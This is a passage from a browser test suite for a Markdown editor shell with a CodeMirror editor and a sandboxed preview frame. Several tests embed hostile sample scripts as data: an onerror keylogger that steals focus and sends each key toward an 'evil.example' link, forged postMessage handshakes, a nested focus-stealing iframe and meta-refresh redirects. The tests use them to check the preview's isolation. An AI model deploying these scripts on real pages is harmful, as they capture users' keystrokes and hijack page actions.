    expect(await p.evaluate('shell_c.adapter.getSelection()')).toEqual({ from: 22, to: 22 });
    await p.keyboard.type('!');
    expect(await p.evaluate('shell_c.getText()')).toBe(`${T}Second line!`);
    await p.close();
  });

  it('[E.13] [E.21] keystrokes typed while CodeMirror arrives — before a key, between its keydown and keyup, as bare text input, or as a textarea change whose input event has not run — all land in order exactly once, the caret stays where the reader left it, and undo walks back to the original', async () => {
    const T = '# L\r\n\r\nx\r\n';
    const S = 'ab cd\nef gh';
    const p = await open();
    await p.addScriptTag({ url: `${A}/cm6.js` }); // the modules, handed over by loadModules when the test says
    await p.evaluate(`window.mountLate = function (text) {
      var E = window.OrzEditor, c = document.getElementById('c'), arrive;
      if (window.shell_c) window.shell_c.destroy();
      c.innerHTML = '';
      var gate = new Promise(function (r) { arrive = r; });
      window.__arrive = function () { arrive(window.OrzCodeMirror6); };
      window.__engine = null;
      window.shell_c = E.createEditorShell(c, {
        text: text, render: function (t) { return E.renderMarkdownPreview(t); },
        adapter: E.codemirror6Adapter({ loadModules: function () { return gate; } }),
        hooks: { save: function () { return Promise.resolve(); } }, preview: { assets: false, debounceMs: 50 },
      });
      window.shell_c.ready.then(function (r) { window.__engine = r.engine; });
    }`);
    const key = (ch: string): string => (ch === '\n' ? 'Enter' : ch);
    const arrive = async (): Promise<void> => {
      await p.evaluate('window.__arrive()');
      await p.waitForFunction('window.__engine === "codemirror6"');
    };
    // every point of arrival, each with a different way of typing the key it lands on
    const phases = ['before', 'between', 'insertText', 'pending'] as const;
    let runs = 0;
    for (let at = 0; at < S.length; at++) {
      const phase = phases[at % phases.length];
      if (phase !== 'before' && S[at] === '\n') continue;
      await p.evaluate(`mountLate(${JSON.stringify(T)})`);
      await p.locator('#c textarea').click();
      await p.locator('#c textarea').evaluate((ta) => { const t = ta as HTMLTextAreaElement; t.setSelectionRange(t.value.length, t.value.length); });
      for (let i = 0; i < S.length; i++) {
        const ch = S[i];
        if (i !== at) { await p.keyboard.press(key(ch)); continue; }
        if (phase === 'before') { await arrive(); await p.keyboard.press(key(ch)); }
        else if (phase === 'between') { await p.keyboard.down(ch); await arrive(); await p.keyboard.up(ch); }
        else if (phase === 'insertText') { await arrive(); await p.keyboard.insertText(ch); }
        else {
          // the textarea has the character but its input event has not been handled yet when CodeMirror arrives
          await p.evaluate(`(function () {
            var ta = shell_c.root.querySelector('textarea'), n = ta.selectionStart;
            ta.value = ta.value.slice(0, n) + ${JSON.stringify(ch)} + ta.value.slice(n);
            ta.setSelectionRange(n + 1, n + 1);
            window.__arrive();
          })()`);
          await p.waitForFunction('window.__engine === "codemirror6"');
        }
      }
      const where = `arrival at ${at} (${phase})`;
      expect(await p.evaluate('shell_c.adapter.name'), where).toBe('codemirror6');
      const typed = `${T}${S.replace(/\n/g, '\r\n')}`;
      expect(await p.evaluate('shell_c.getText()'), where).toBe(typed);
      expect(await p.evaluate('shell_c.isDirty()'), where).toBe(true);
      expect(await p.evaluate('shell_c.adapter.getSelection()'), where).toEqual({ from: toEditorText(typed).length, to: toEditorText(typed).length });
      await p.keyboard.type('!');
      expect(await p.evaluate('shell_c.getText()'), where).toBe(`${typed}!`);
      const back = await p.evaluate('(function () { var n = 0; while (shell_c.undo() && n < 100) n++; return [n, shell_c.getText()]; })()') as [number, string];
      expect(back[1], where).toBe(T);
      expect(back[0], where).toBeGreaterThan(0);
      expect(await p.evaluate('(function () { while (shell_c.redo()); return shell_c.getText(); })()'), where).toBe(`${typed}!`);
      runs++;
    }
    expect(runs).toBeGreaterThanOrEqual(9);
    await p.close();
  }, 120_000);
  it('[E.13] [E.22] setReadOnly switches CodeMirror at run time, also when set while CodeMirror was still loading; read-only CodeMirror stays focusable and selectable (2.2.0) and the shell\'s keys still work', async () => {
    const T = '# RO\n\nbody\n';
    const p = await open();
    await p.evaluate(`void (window.__r = mountOpts('c', ${JSON.stringify(T)}, ${JSON.stringify(`${A}/cm6-slow.js`)}))`);
    await p.evaluate('shell_c.setReadOnly(true)');
    expect(await p.locator('#c textarea').evaluate((ta) => (ta as HTMLTextAreaElement).readOnly)).toBe(true);
    expect(await p.evaluate('window.__r')).toEqual({ engine: 'codemirror6', error: null });
    await p.locator('#c .cm-content').click();
    await p.keyboard.type('blocked');
    expect(await p.evaluate('[shell_c.getText(), shell_c.isReadOnly(), shell_c.root.querySelector(".cm-content").getAttribute("contenteditable")]')).toEqual([T, true, 'false']);
    // 2.2.0: read-only stays focusable and selectable (FC-19 §5 invariant 7): the content takes the focus,
    // the reader selects with the keyboard, and the shell's keymap still hears keys (nothing is edited)
    expect(await p.evaluate('[shell_c.root.activeElement && shell_c.root.activeElement.className.includes("cm-content"), shell_c.root.querySelector(".cm-content").getAttribute("tabindex"), shell_c.root.querySelector(".cm-content").getAttribute("aria-readonly")]')).toEqual([true, '0', 'true']);
    await p.keyboard.press('ControlOrMeta+a');
    expect(await p.evaluate('shell_c.adapter.getSelection()')).toEqual({ from: 0, to: T.length });
    // copy: CodeMirror puts the selection on the clipboard from the read-only content
    expect(await p.evaluate(`(function () {
      var c = shell_c.root.querySelector('.cm-content');
      var dt = new DataTransfer();
      c.dispatchEvent(new ClipboardEvent('copy', { clipboardData: dt, bubbles: true, cancelable: true }));
      return dt.getData('text/plain');
    })()`)).toBe(T);
    const was = await p.evaluate('shell_c.getMode()');
    await p.keyboard.press('ControlOrMeta+\\');
    expect(await p.evaluate('shell_c.getMode()')).toBe(was === 'split' ? 'editor' : was === 'editor' ? 'preview' : 'split');
    await p.evaluate('shell_c.setMode("split")');
    await p.locator('#c .cm-content').click();
    await p.keyboard.press('Backspace');
    expect(await p.evaluate('shell_c.getText()')).toBe(T);
    await p.evaluate('shell_c.blur && shell_c.blur()');
    await p.evaluate('document.activeElement && document.activeElement.blur()');
    await p.evaluate('shell_c.focus()');
    expect(await p.evaluate('!!(shell_c.root.activeElement && shell_c.root.activeElement.className.includes("cm-content"))')).toBe(true);
    await p.evaluate('shell_c.setReadOnly(false)');
    await p.locator('#c .cm-content').click();
    await p.keyboard.press('ControlOrMeta+ArrowDown');
    await p.keyboard.type('open');
    expect(await p.evaluate('shell_c.getText()')).toBe(`${T}open`);
    await p.close();
  });

  it('[E.13] [E.38] [E.39] [E.40] (2.4.0) in CodeMirror: applyEdits is one undo step (the shell\'s undo and Mod+Z) with the caret mapped; select scrolls the range into view (not with scroll: false); setFocusRange dims exactly the text outside the range, follows typing inside it, folds the lines outside with mode fold (only the range\'s lines in the DOM, search and the text still whole), clears with null, and a range set while CodeMirror loads applies when it arrives', async () => {
    const slides = Array.from({ length: 60 }, (_, i) => `<!-- slide -->\n## Slide ${i}\n\nText of slide ${i}.\n`).join('\n');
    const T = `{{nyml\nkind: document\n}}\n\n${slides}`;
    const p = await open();
    const s30 = T.indexOf('<!-- slide -->\n## Slide 30');
    const s31 = T.indexOf('<!-- slide -->\n## Slide 31');
    // a range set while CodeMirror is still loading applies once it arrives
    await p.evaluate(`void (window.__r = mountOpts('c', ${JSON.stringify(T)}, ${JSON.stringify(`${A}/cm6-slow.js`)}))`);
    await p.evaluate(`shell_c.setFocusRange(${s30}, ${s31})`);
    expect(await p.evaluate('window.__r')).toEqual({ engine: 'codemirror6', error: null });
    const outside = () => p.evaluate(`(function () {
      var r = shell_c.root, view = r.querySelector('.cm-content');
      var dim = Array.prototype.map.call(r.querySelectorAll('.orz-focus-outside'), function (n) { return n.textContent; }).join('');
      var plain = Array.prototype.filter.call(view.querySelectorAll('.cm-line'), function (l) { return !l.querySelector('.orz-focus-outside') && l.textContent; }).map(function (l) { return l.textContent; });
      return { dim: dim.length > 0, plain: plain };
    })()`) as Promise<{ dim: boolean; plain: string[] }>;
    await p.evaluate(`shell_c.select(${s30}, ${s30})`);
    await p.waitForTimeout(100);
    let o = await outside();
    expect(o.dim).toBe(true);
    expect(o.plain).toEqual(['<!-- slide -->', '## Slide 30', 'Text of slide 30.']);
    // typing inside the range: the range follows
    await p.locator('#c .cm-content').click();
    await p.evaluate(`shell_c.select(${T.indexOf('Text of slide 30.') + 'Text of slide 30.'.length}, ${T.indexOf('Text of slide 30.') + 'Text of slide 30.'.length})`);
    await p.keyboard.type(' More');
    o = await outside();
    expect(o.plain).toEqual(['<!-- slide -->', '## Slide 30', 'Text of slide 30. More']);
    // fold: only the range's lines are in the DOM (the text and the search see everything)
    const t2 = String(await p.evaluate('shell_c.getText()'));
    await p.evaluate(`shell_c.setFocusRange(${s30}, ${t2.indexOf('<!-- slide -->\n## Slide 31')}, { mode: 'fold' })`);
    // CodeMirror redraws on its next frame (later under load): wait until the folded view has settled
    const lines = `Array.prototype.map.call(shell_c.root.querySelectorAll('.cm-content .cm-line'), function (l) { return l.textContent; }).filter(function (l) { return l; })`;
    await p.waitForFunction(`${lines}.length === 3`, null, { timeout: 5000 }).catch(() => undefined);
    expect(await p.evaluate(lines)).toEqual(['<!-- slide -->', '## Slide 30', 'Text of slide 30. More']);
    expect(await p.evaluate('shell_c.getText()')).toBe(t2);
    await p.evaluate('shell_c.setFocusRange(null)');
    await p.waitForTimeout(100);
    expect(await p.evaluate(`shell_c.root.querySelectorAll('.orz-focus-outside').length`)).toBe(0);
    // unfolded: other slides' lines are back in the view (which ones depends on the scroll)
    await p.waitForFunction(`${lines}.length > 6`, null, { timeout: 5000 }).catch(() => undefined);
    expect((await p.evaluate(lines) as string[]).filter((l) => /^## Slide \d+$/.test(l) && l !== '## Slide 30').length).toBeGreaterThan(0);
    // applyEdits: one undo step for several edits, the caret mapped
    const before = String(await p.evaluate('shell_c.getText()'));
    const a = before.indexOf('## Slide 2\n');
    const b = before.indexOf('## Slide 50\n');
    const caret = before.indexOf('Text of slide 40.');
    await p.evaluate(`shell_c.select(${caret}, ${caret}, { scroll: false })`);
    expect(await p.evaluate(`shell_c.applyEdits([{ from: ${a}, to: ${a + 2}, insert: '###' }, { from: ${b}, to: ${b + 2}, insert: '#' }], { label: 'levels' })`)).toBe(true);
    const after = String(await p.evaluate('shell_c.getText()'));
    expect(after).toBe(before.slice(0, a) + '###' + before.slice(a + 2, b) + '#' + before.slice(b + 2));
    expect(await p.evaluate('shell_c.adapter.getSelection()')).toEqual({ from: caret + 1, to: caret + 1 });
    await p.locator('#c .cm-content').focus();
    await p.keyboard.press('ControlOrMeta+z');
    expect(await p.evaluate('shell_c.getText()')).toBe(before);
    await p.keyboard.press('ControlOrMeta+Shift+z');
    expect(await p.evaluate('shell_c.getText()')).toBe(after);
    expect(await p.evaluate('shell_c.undo()')).toBe(true);
    expect(await p.evaluate('shell_c.getText()')).toBe(before);
    // select scrolls the range into view; scroll: false does not
    const scroller = `shell_c.root.querySelector('.cm-scroller')`;
    // let the undo's own scroll (CodeMirror reveals the caret after it) settle first
    await p.evaluate('shell_c.root.activeElement && shell_c.root.activeElement.blur()');
    await p.waitForTimeout(400);
    await p.evaluate(`${scroller}.scrollTop = 0`);
    await p.waitForTimeout(200);
    const top0 = await p.evaluate(`${scroller}.scrollTop`);
    const end = before.indexOf('Text of slide 58.');
    await p.evaluate(`shell_c.select(${end}, ${end + 4}, { scroll: false })`);
    await p.waitForTimeout(200);
    expect(await p.evaluate(`${scroller}.scrollTop`)).toBe(top0);
    await p.evaluate(`shell_c.select(${end}, ${end + 4})`);
    const shown = `(function () {
      var r = shell_c.root, sc = r.querySelector('.cm-scroller').getBoundingClientRect();
      var line = Array.prototype.find.call(r.querySelectorAll('.cm-line'), function (l) { return l.textContent === 'Text of slide 58.'; });
      if (!line) return false;
      var b = line.getBoundingClientRect();
      return b.top >= sc.top - 1 && b.bottom <= sc.bottom + 1;
    })()`;
    await p.waitForFunction(shown, null, { timeout: 5000 }).catch(() => undefined);
    expect(await p.evaluate(shown)).toBe(true);
    await p.close();
  });

  it('[E.41] (2.4.0) in CodeMirror: flash lights exactly the lines the ranges touch (a range ending at a line start not that line; CR LF offsets mapped), follows an edit above it, and is gone after its time; the text and the undo history are untouched', async () => {
    const T = `{{nyml\r\nkind: document\r\n}}\r\n\r\n<!-- slide 2col -->\r\n## One\r\nLeft\r\n<!-- @right -->\r\nRight\r\n`;
    const p = await open();
    expect(await p.evaluate(`mountOpts('b', ${JSON.stringify(T)}, ${JSON.stringify(`${A}/cm6.js`)})`)).toEqual({ engine: 'codemirror6', error: null });
    const lit = `Array.prototype.map.call(shell_b.root.querySelectorAll('.cm-line.orz-flash'), function (l) { return l.textContent; })`;
    const a = T.indexOf('<!-- slide');
    const b = T.indexOf('<!-- @right');
    // the slide marker line (a whole-line range: it ends at the next line's start) and the region marker
    await p.evaluate(`shell_b.flash([{ from: ${a}, to: ${T.indexOf('## One')} }, { from: ${b}, to: ${b + 3} }], { ms: 900 })`);
    await p.waitForFunction(`${lit}.length === 2`, null, { timeout: 3000 });
    expect(await p.evaluate(lit)).toEqual(['<!-- slide 2col -->', '<!-- @right -->']);
    // an edit above: the light follows its lines
    await p.evaluate(`shell_b.applyEdits([{ from: ${T.indexOf('}}')}, to: ${T.indexOf('}}')}, insert: 'title: x\\n' }])`);
    expect(await p.evaluate(lit)).toEqual(['<!-- slide 2col -->', '<!-- @right -->']);
    await p.waitForFunction(`${lit}.length === 0`, null, { timeout: 3000 });
    expect(await p.evaluate('shell_b.undo()')).toBe(true);
    expect(await p.evaluate('shell_b.getText()')).toBe(T);
    expect(await p.evaluate('shell_b.undo()')).toBe(false);
    await p.close();
  });

  it('[E.42] (2.4.0) in CodeMirror: getSelection gives the selection in exact offsets (BOM, CR LF) and follows a change that maps it without a selection event — a header setting above the caret, applyEdits, setText', async () => {
    const T = `\ufeff{{nyml\r\nkind: document\r\n}}\r\n\r\n<!-- slide -->\r\n## One\r\nBody one\r\n<!-- slide -->\r\n## Two\r\nBody two\r\n`;
    const p = await open();
    expect(await p.evaluate(`mountOpts('b', ${JSON.stringify(T)}, ${JSON.stringify(`${A}/cm6.js`)})`)).toEqual({ engine: 'codemirror6', error: null });
    const two = T.indexOf('## Two');
    await p.evaluate(`shell_b.select(${two}, ${two + 2})`);
    expect(await p.evaluate('shell_b.getSelection()')).toEqual({ from: two, to: two + 2 });
    await p.evaluate(`window.__sel = 0; shell_b.on('selection', function () { window.__sel++; })`);
    // a header setting adds a line above the caret: no selection event, the selection moved with its text
    await p.evaluate(`shell_b.setHeader({ title: 'A title' })`);
    const t1 = await p.evaluate('shell_b.getText()') as string;
    const s1 = await p.evaluate('shell_b.getSelection()') as { from: number; to: number };
    expect(t1.slice(s1.from, s1.to)).toBe('##');
    expect(s1.from).toBe(t1.indexOf('## Two'));
    // applyEdits before it, then setText with the same text around it
    await p.evaluate(`shell_b.applyEdits([{ from: ${T.indexOf('Body one')}, to: ${T.indexOf('Body one')}, insert: 'More. ' }])`);
    const t2 = await p.evaluate('shell_b.getText()') as string;
    const s2 = await p.evaluate('shell_b.getSelection()') as { from: number; to: number };
    expect(t2.slice(s2.from, s2.to)).toBe('##');
    expect(await p.evaluate('window.__sel')).toBe(0);
    await p.evaluate('shell_b.destroy()');
    expect(await p.evaluate('shell_b.getSelection()')).toBeNull();
    await p.close();
  });

  // ── option B (2026-10-06): the frame secret; focus a document script takes is an accepted limit ──
  const STEAL = "var i=document.createElement('input');document.body.appendChild(i);document.addEventListener('keydown',function(e){parent.postMessage({stolen:e.key},'*');parent.postMessage({type:'orz-preview-key',key:'s'},'*');parent.postMessage({type:'orz-preview-key',key:'\\\\'},'*');parent.postMessage({type:'orz-preview-link',href:'https://evil.example/'+e.key},'*')},true);setInterval(function(){if(document.activeElement!==i)i.focus()},50)";
  const TEXT_STEAL = `# Doc\n\nHello <img src="x" onerror="${STEAL}">\n`;
  /** An attribute value (an `onerror` handler, a `srcdoc`) holding script text. */
  const attr = (js: string) => js.replace(/&/g, '&amp;').replace(/"/g, '&quot;');

  it('[E.13] [E.14] a document script that takes the keyboard focus every 50 ms (and forges a save, a view key and a link on the window per stolen key) may get the reader\'s keys — the accepted limit — but nothing else: no save, no view change, no link or window (window.open stubbed, and real), no pause, note or error; a reader\'s click into the preview is just that, and Cmd/Ctrl+S there saves', async () => {
    for (const stub of [true, false]) {
      const p = await open();
      await p.evaluate(`window.__stolen = []; window.__opened = []; ${stub ? 'window.open = function (u) { window.__opened.push(u); return null; };' : ''}
        window.addEventListener('message', function (e) { if (e.data && e.data.stolen) window.__stolen.push(e.data.stolen); })`);
      expect(await p.evaluate(`mountOpts('a', ${JSON.stringify(TEXT_STEAL)}, ${JSON.stringify(`${A}/cm6.js`)}, { links: true })`)).toEqual({ engine: 'codemirror6', error: null });
      await p.waitForTimeout(1000);
      await p.locator('#a .cm-content').click();
      await p.keyboard.press('ControlOrMeta+End');
      await p.waitForTimeout(200);
      await p.keyboard.type('hello world', { delay: 60 });
      await p.waitForTimeout(500);
      const where = stub ? 'window.open stubbed' : 'real window.open';
      const [text, stolen, saved, opened, links, mode] = await p.evaluate('[shell_a.getText(), window.__stolen.join(""), window.__saved.a.length, window.__opened.length, window.__links.length, shell_a.getMode()]') as [string, string, number, number, number, string];
      // keys may go to the preview (the accepted limit) — what reached the editor is in order, and every key went one way or the other
      expect(text.startsWith(TEXT_STEAL), where).toBe(true);
      expect(text.length - TEXT_STEAL.length + stolen.replace(/Control|Meta|\\/g, '').length, where).toBeGreaterThanOrEqual('hello world'.length - 1);
      expect([saved, opened, links, mode], where).toEqual([0, 0, 0, 'split']);
      expect(p.context().pages(), where).toHaveLength(1);
      expect(await p.evaluate('[!!shell_a.root.querySelector("[data-orz-paused]"), errors_a, shell_a.root.querySelector("iframe").srcdoc.indexOf("Content-Security-Policy")]'), where).toEqual([false, [], -1]);
      await p.close();
    }
    // preview-only: after a real click into the preview, Cmd/Ctrl+S there saves (the reader's own key through the port)
    const q = await open();
    await q.evaluate(`mountOpts('a', '# Preview only\\n\\nbody\\n', ${JSON.stringify(`${A}/cm6.js`)})`);
    await q.evaluate('shell_a.setMode("preview")');
    await frameOf(q, 'body');
    await q.locator('#a iframe').click({ position: { x: 300, y: 30 } });
    await q.keyboard.press('ControlOrMeta+s');
    await q.waitForFunction('window.__saved.a.length === 1');
    expect(await q.evaluate('[shell_a.root.activeElement === shell_a.root.querySelector("iframe"), errors_a]')).toEqual([true, []]);
    await q.close();
  }, 60_000);

  it('[E.13] [E.14] [E.5] the round-3 vectors get no port and so act on nothing: forged readies (none, a channel, a wrong secret) with forged keys and links; a nested <iframe srcdoc> that steals the focus and posts to the top; document.open() then a ready; a meta refresh to an http page of another origin and to a data: URL, each asking for the port — no save, no view change, no Escape action, no link, no window, no editor scroll; the secret is not in the frame\'s DOM, and after the forgeries the real port still carries renders and the reader\'s own Cmd/Ctrl+S', async () => {
    const LONG = Array.from({ length: 150 }, (_, i) => `Line ${i}.\n`).join('\n');
    const vectors: Record<string, string> = {
      'forged readies': `<img src="x" onerror="${attr(`${GRAB};setInterval(function(){var T=parent;T.postMessage({type:'orz-preview-ready'},'*');T.postMessage({type:'orz-preview-ready',channel:'c1'},'*');T.postMessage({type:'orz-preview-ready',channel:'c2',secret:'guess'},'*');T.postMessage({type:'orz-preview-key',key:'s'},'*');T.postMessage({type:'orz-preview-key',key:'\\\\'},'*');T.postMessage({type:'orz-preview-key',key:'Escape'},'*');T.postMessage({type:'orz-preview-scrolled',top:0,max:100000},'*');T.postMessage({type:'orz-preview-link',href:'https://evil.example/w'},'*')},100)`)}">`,
      'nested frame': `<iframe srcdoc="${attr(`<script>${GRAB};var i=document.createElement('input');document.documentElement.appendChild(i);setInterval(function(){i.focus();top.postMessage({type:'orz-preview-ready',channel:'n'},'*');top.postMessage({type:'orz-preview-key',key:'s'},'*');top.postMessage({type:'orz-preview-key',key:'\\\\'},'*');parent.parent.postMessage({type:'orz-preview-link',href:'https://evil.example/n'},'*')},60)</` + 'script>')}"></iframe>`,
      'document.open': `<img src="x" onerror="${attr(`setTimeout(function(){document.open();document.write('<body><p>replaced</p></body>');document.close();${GRAB}},300)`)}">`,
      'meta refresh http': `<meta http-equiv="refresh" content="1;url=${EVIL}">`,
      'meta refresh data': `<meta http-equiv="refresh" content="1;url=data:text/html;base64,${Buffer.from(`<!doctype html><script>${GRAB}</` + 'script>').toString('base64')}">`,
    };
    for (const [name, body] of Object.entries(vectors)) {
      const p = await open();
      await p.evaluate('window.__opened = []; window.open = function (u) { window.__opened.push(u); return null; }');
      const text = `# Vector\n\n${body}\n\n${LONG}`;
      await p.evaluate(`mountOpts('a', ${JSON.stringify(text)}, ${JSON.stringify(`${A}/cm6.js`)}, { links: true })`);
      if (name === 'forged readies') {
        const f = await frameOf(p, 'Line 149.');
        const secret = String(await p.evaluate('/data-orz-preview-secret="([^"]+)"/.exec(shell_a.root.querySelector("iframe").srcdoc)[1]'));
        expect(secret.length, name).toBeGreaterThan(20);
        expect(await f.evaluate(`[document.querySelectorAll("[data-orz-preview-secret]").length, document.documentElement.outerHTML.indexOf(${JSON.stringify(secret)})]`), name).toEqual([0, -1]);
      }
      await p.locator('#a .cm-content').click();
      await p.keyboard.press('ControlOrMeta+End');
      await p.keyboard.type('typed', { delay: 40 });
      await p.waitForTimeout(2600); // the refreshes (1 s) have navigated and asked for the port
      const grabbed: string[] = [];
      for (const f of p.frames()) if (f !== p.mainFrame()) grabbed.push(String(await f.evaluate('window.__got || ""').catch(() => '')));
      const state = await p.evaluate(`[window.__saved.a.length, shell_a.getMode(), window.__links.length, window.__opened.length, shell_a.root.activeElement && shell_a.root.activeElement.className, errors_a.length]`) as [number, string, number, number, string, number];
      expect(grabbed.join(''), `${name}: a document got the port`).not.toContain('[port]');
      expect(state.slice(0, 4), name).toEqual([0, 'split', 0, 0]);
      expect(p.context().pages(), name).toHaveLength(1);
      if (name !== 'nested frame') {
        // the editor keeps the focus (no forged Escape moved it to the toolbar) and its scroll at the end
        expect(state[4], name).toContain('cm-content');
        expect(await p.locator('#a .cm-scroller').evaluate((el) => (el as HTMLElement).scrollTop), name).toBeGreaterThan(1000);
        expect(await p.evaluate('shell_a.getText().endsWith("typed")'), name).toBe(true);
      }
      if (name === 'forged readies') {
        // the real port stays open: an edit renders, and the reader's own Cmd/Ctrl+S in the frame saves once
        await p.keyboard.type(' more');
        await frameOf(p, 'typed more');
        await p.locator('#a iframe').click({ position: { x: 300, y: 20 } });
        await p.keyboard.press('ControlOrMeta+s');
        await p.waitForFunction('window.__saved.a.length === 1');
        await p.waitForTimeout(400);
        expect(await p.evaluate('[window.__saved.a.length, shell_a.getMode(), window.__links.length]')).toEqual([1, 'split', 0]);
      }
      await p.close();
    }
  }, 120_000);

  it('[E.13] [E.14] a tab switch round trip with the focus in the preview leaves it working: Chrome gives the frame the focus back, which is the reader\'s, so nothing is paused or noted and no error; edits still render and Cmd/Ctrl+S in the frame saves — also in the preview-only view', async () => {
    for (const view of ['split', 'preview'] as const) {
      const ctx = await browser!.newContext({ viewport: { width: 1200, height: 1400 } });
      const p = await ctx.newPage();
      await p.goto(`${A}/`);
      await p.waitForFunction('typeof window.mount === "function"');
      await p.evaluate(`mountOpts('a', '# Tabs\\n\\n' + Array.from({ length: 40 }, function (_, i) { return 'Para ' + i + ' lorem ipsum.\\n'; }).join('\\n'), ${JSON.stringify(`${A}/cm6.js`)})`);
      if (view === 'preview') await p.evaluate('shell_a.setMode("preview")');
      await frameOf(p, 'Para 39');
      await p.locator('#a iframe').click({ position: { x: 200, y: 60 } });
      await p.mouse.wheel(0, 300);
      await p.waitForTimeout(400);
      for (let i = 0; i < 2; i++) {
        const other = await ctx.newPage();
        await other.goto(`${A}/`);
        await other.bringToFront();
        await other.waitForTimeout(600);
        await p.bringToFront();
        await p.waitForTimeout(1500);
        await other.close();
      }
      expect(await p.evaluate('[!!shell_a.root.querySelector("[data-orz-paused]"), errors_a, shell_a.root.querySelector("iframe").srcdoc.indexOf("Content-Security-Policy")]'), view).toEqual([false, [], -1]);
      await p.locator('#a iframe').click({ position: { x: 200, y: 60 } });
      await p.keyboard.press('ControlOrMeta+s');
      await p.waitForFunction('window.__saved.a.length === 1');
      await p.evaluate('shell_a.setMode("split"); shell_a.setText(shell_a.getText() + "\\nAfter the tabs.\\n")');
      await frameOf(p, 'After the tabs.');
      await ctx.close();
    }
  }, 60_000);

  it('[E.13] [E.14] a link the reader clicks in the preview is offered in a chip ("Open <host>?") and opens in a new tab only from the reader\'s click on Open', async () => {
    const p = await open();
    await p.evaluate(`mountOpts('a', '# Links\\n\\nSee [the site](https://example.org/page).\\n', ${JSON.stringify(`${A}/cm6.js`)})`);
    const f = await frameOf(p, 'the site');
    await p.context().route('https://example.org/**', (r) => r.fulfill({ status: 200, contentType: 'text/html', body: '<title>example</title>' }));
    await f.locator('a').click();
    await expect.poll(() => p.evaluate('(function () { var c = shell_a.root.querySelector(".orz-editor__link-chip"); return c ? c.getAttribute("data-orz-link") : null; })()')).toBe('https://example.org/page');
    expect(p.context().pages()).toHaveLength(1);
    const [tab] = await Promise.all([p.context().waitForEvent('page'), p.locator('#a .orz-editor__link-chip button').first().click()]);
    expect(tab.url()).toBe('https://example.org/page');
    await tab.close();
    await p.close();
  });

  it('[E.13] [E.25] a shell mounted into a popup\'s document by the opener\'s script shows its preview (the frame takes the shell\'s messages through its private port, whatever window posted them)', async () => {
    const p = await open();
    const [pop] = await Promise.all([p.waitForEvent('popup'), p.evaluate('window.__pop = window.open("about:blank", "x", "width=1000,height=500")')]);
    await p.evaluate(`(function () {
      var d = window.__pop.document, host = d.createElement('div');
      host.style.height = '400px'; d.body.appendChild(host);
      window.ps = OrzEditor.createEditorShell(host, { text: '# hi\\n\\nfrom the opener\\n', mode: 'preview', render: OrzEditor.renderMarkdownPreview, adapter: OrzEditor.textareaAdapter(), hooks: { save: function () { return Promise.resolve(); } }, preview: { assets: false, debounceMs: 10 } });
    })()`);
    let shown = '';
    await expect.poll(async () => {
      for (const f of pop.frames()) if (f !== pop.mainFrame()) shown = String(await f.evaluate('document.getElementById("orz-doc") ? document.getElementById("orz-doc").textContent : ""').catch(() => ''));
      return shown;
    }, { timeout: 5000 }).toContain('from the opener');
    await p.evaluate('ps.destroy()');
    await pop.close();
    await p.close();
  });

  it('[E.13] [E.19] a stylesheet that takes 6 s does not hold the preview back: the frame is ready and shows the document at once, and there is no "could not start" error', async () => {
    const p = await open();
    await p.evaluate(`mountOpts('a', '# Slow theme\\n\\nshown at once\\n', ${JSON.stringify(`${A}/cm6.js`)}, { preview: { readyTimeoutMs: 3000, head: '<link rel="stylesheet" href="${A}/slow.css">' } })`);
    const t0 = Date.now();
    const f = await frameOf(p, 'shown at once');
    expect(Date.now() - t0).toBeLessThan(2500);
    await p.waitForTimeout(3500);
    expect(await p.evaluate('[errors_a.length, shell_a.root.querySelector(".orz-editor__preview-note")]')).toEqual([0, null]);
    await expect.poll(() => f.evaluate('getComputedStyle(document.body).color'), { timeout: 8000 }).toBe('rgb(0, 0, 255)');
    await p.close();
  }, 30_000);

  it('[E.13] [E.25] a carrier\'s frame document customises the default bridge with page hooks: __orzPreviewApply (async) draws each render and is acknowledged when it settles, __orzPreviewNavigate gets the navigate line, __orzPreviewMessage gets shell.preview.post, and shell.preview.on hears __orzPreview.post', async () => {
    const p = await open();
    await p.evaluate(`window.__heard = []; mountOpts('a', '# One\\n\\n---\\n\\n# Two\\n', ${JSON.stringify(`${A}/cm6.js`)}, { preview: { mode: 'navigate', frameDocument: function (parts) {
      return '<!doctype html><html><head>' + parts.bridge + parts.head + '</head><body><main id="deck"></main><script>' +
        'window.__applied = 0; window.__navs = []; window.__msgs = [];' +
        'window.__orzPreviewApply = function (html) { return new Promise(function (r) { setTimeout(function () { document.getElementById("deck").innerHTML = html; window.__applied++; r(); }, 120); }); };' +
        'window.__orzPreviewNavigate = function (line) { window.__navs.push(line); window.__orzPreview.post({ type: "x-deck-at", line: line }); };' +
        'window.__orzPreviewMessage = function (m) { window.__msgs.push(m.type); };' +
        '</' + 'script></body></html>';
    } } })`);
    await p.evaluate('shell_a.preview.on("x-deck-at", function (m) { window.__heard.push(m.line); })');
    const f = await (async () => { for (let i = 0; i < 100; i++) { for (const x of p.frames()) { if (x !== p.mainFrame() && await x.evaluate('window.__applied || 0').catch(() => 0)) return x; } await p.waitForTimeout(50); } throw new Error('no frame'); })();
    expect(await f.evaluate('document.getElementById("deck").textContent')).toContain('Two');
    await p.evaluate('shell_a.focus(); shell_a.adapter.setSelection({ from: 10, to: 10 })');
    await expect.poll(() => f.evaluate('window.__navs.slice(-1)[0]')).toBe(2);
    await expect.poll(() => p.evaluate('window.__heard.slice(-1)[0]')).toBe(2);
    expect(await p.evaluate('shell_a.preview.post({ type: "x-deck-go", delta: 1 })')).toBe(true);
    await expect.poll(() => f.evaluate('window.__msgs.join(",")')).toBe('x-deck-go');
    // __orzPreview.navigated(line) reads a line back through the port — only after the reader's own input in the frame
    await p.evaluate('window.__lines = []; var sc = shell_a.adapter.scrollTo.bind(shell_a.adapter); shell_a.adapter.scrollTo = function (t) { if (t && typeof t.line === "number") window.__lines.push(t.line); return sc(t); }');
    await f.evaluate('window.__orzPreview.navigated(3)'); // a script, no input of the reader's: nothing
    await p.waitForTimeout(300);
    expect(await p.evaluate('window.__lines')).toEqual([]);
    await p.locator('#a iframe').click({ position: { x: 200, y: 20 } });
    await f.evaluate('window.__orzPreview.navigated(4)');
    await expect.poll(() => p.evaluate('window.__lines.slice(-1)[0]')).toBe(4);
    await p.close();
  });

  it('[E.13] [E.21] CodeMirror arriving after 200 textarea steps of a 1.25 MB document replays only the newest 100 (it was every step: 20.9 s and 586 MB) and undo walks them back exactly', async () => {
    let big = readFileSync('tests/carrier-corpus/md/large.md', 'utf8');
    while (big.length < 1_250_000) big += big;
    big = big.slice(0, 1_250_000);
    const p = await open();
    await p.addScriptTag({ url: `${A}/cm6.js` });
    await p.evaluate((text) => {
